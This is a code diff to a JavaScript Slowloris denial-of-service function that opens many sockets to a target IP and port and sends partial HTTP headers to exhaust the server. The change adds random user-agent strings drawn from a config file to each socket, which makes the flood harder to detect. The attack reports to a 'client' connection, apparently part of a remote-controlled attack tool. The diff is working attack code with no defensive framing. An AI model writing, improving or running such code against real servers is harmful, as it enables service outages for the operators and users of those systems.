@@ -1,5 +1,6 @@
 import net from "net";
 import { client } from "../client.js";
+import UAs from "../../config/UAs.json" assert { type: "json" };
 
 export default function slowLoris(ip, port, attackDuration, sockets) {
 	if (port === undefined || port === "") {
@@ -11,10 +12,6 @@ export default function slowLoris(ip, port, attackDuration, sockets) {
 	if (sockets === undefined || sockets === "") {
 		sockets = 200;
 	}
-
-	// setTimeout(() => {
-	// 	client.write("Attack completed!");
-	// }, attackDuration);
 
 	let activeSockets = 0;
 	let socketsTargetReached = false;
@@ -34,7 +31,7 @@ export default function slowLoris(ip, port, attackDuration, sockets) {
 			socket.write(`Host: ${ip}\r\n`);
 			socket.write("Accept: */*\r\n");
 			socket.write(
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n"
+				`${UAs[Math.floor(Math.random() * UAs.length)]}\r\n`
 			);
 
 			setInterval(() => {
